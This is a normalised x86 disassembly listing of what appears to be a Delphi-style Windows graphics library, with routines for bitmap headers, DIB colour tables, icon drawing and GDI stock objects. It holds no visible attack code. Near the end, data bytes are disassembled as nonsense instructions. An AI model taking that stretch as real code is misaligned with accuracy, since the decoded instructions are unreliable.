mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_41fdbc
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_420610
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_420610
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_41f354
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420f0c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4203b0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_41fdbc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420f60
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4203b0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_41fdbc
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420fe0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4203a0
mov eax ebx
call sub_4203b0
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_41f354
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421077
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f24c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41b6ec
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4210b4
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4203b0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_41fdbc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421110
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_42032c
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41e748
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4158f4
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4158f4
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4201f0
mov dl [ r-xdata ]
call sub_41d604
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41d91c
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_41f308
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4158f4
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_4158f4
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4158f4
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_4158f4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_4158f4
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_4158f4
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41dd8c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_4158f4
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e0b0
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_4213d0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_4203b0
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_41f354
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42144a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_41f9b8
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421470
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4214b8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ea84
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f180
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_42150c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_41f184
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e90
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_42153c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_421814
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_41f180
mov eax [ esi + 0x28 ]
call sub_41f184
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413ebc
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42159c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41d604
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4215f4
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_421630
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4156b0
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_4158bc
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e35c
jmp r-xdata
jmp r-xdata
call sub_41d814
sub_4216a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421735
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4215f4
cmp eax [ rw-data ]
jne r-xdata
call sub_41d814
mov eax esi
call sub_4215f4
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41e888
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c40
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4158f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42175c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4217ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415690
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_4158bc
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4158bc
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_421814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41d814
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4217ef
mov eax [ ebp - 0x4 ]
call sub_403224
call sub_4039c0
call sub_403a14
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421814
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421854
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f180
mov eax [ ebx + 0x28 ]
call sub_41f184
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4218d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4216a8
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_4158f4
pop esi
pop ebx
retn
sub_421924
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41de5c
mov [ rw-data ] eax
pop ebx
retn
sub_42195c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_4219a0
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42195c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_421a6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_421aa4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_421c9c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_421ae8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421ad0
xor eax eax
push ebp
push sub_421b89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b90
mov eax [ ebp - 0x4 ]
call sub_421adc
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_421b9c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_421b9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421c7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4201f0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41cdac
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41cc90
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4124e4
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d034
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41d4e8
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_41feac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421c9c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_421ad0
xor eax eax
push ebp
push sub_421ce7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421cee
mov eax [ ebp - 0x4 ]
call sub_421adc
retn
mov esp ebp
pop ebp
retn
sub_421cee
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403224
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_421ad0
xor eax eax
push ebp
push sub_421ce7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421cee
mov eax [ ebp - 0x4 ]
call sub_421adc
retn
mov esp ebp
pop ebp
retn
sub_421d14
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41bfbc
push eax
mov eax ebx
call sub_41bfbc
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_421ae8
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_421d4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421e15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e1c
retn
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
call sub_41ee64
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049d8
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4049d8
sub_421e20
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_421924
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_4219a0
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41b700 ]
call sub_41b774
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b700 ]
call sub_41b774
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b700 ]
call sub_41b774
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a6c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413b2c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413b2c
mov [ rw-data ] eax
mov ecx sub_41c014
mov edx sub_41c024
mov eax [ sub_41aa3c ]
call sub_4132e0
mov ecx r-xdata
mov edx sub_41c22c
mov eax [ r-xdata ]
call sub_4132e0
sub_421f2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421f51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421f58
retn
sub_421fb9
aaa
inc ecx
add [ eax + edi + 0x41 ] ch
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax ] fs
inc edx
add [ eax ] cl
add [ eax ] al
add ah cl
pop ds
inc edx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + 0x42 ] dh
add al bl
and [ edx ] eax
mov eax 0xa4004221
and [ edx ] eax
push es
sbb [ eax ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + 0x42 ] dh
add [ eax + 0x2a ] ch
inc eax
add [ eax - 0x5bffbddf ] bh
and [ edx ] eax
or al 0x54
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413b28
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x8000408d
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax edi
call sub_403224
sub_422094
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4220ec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413b28
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403224
sub_422130
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ esi + 0x4 ] eax
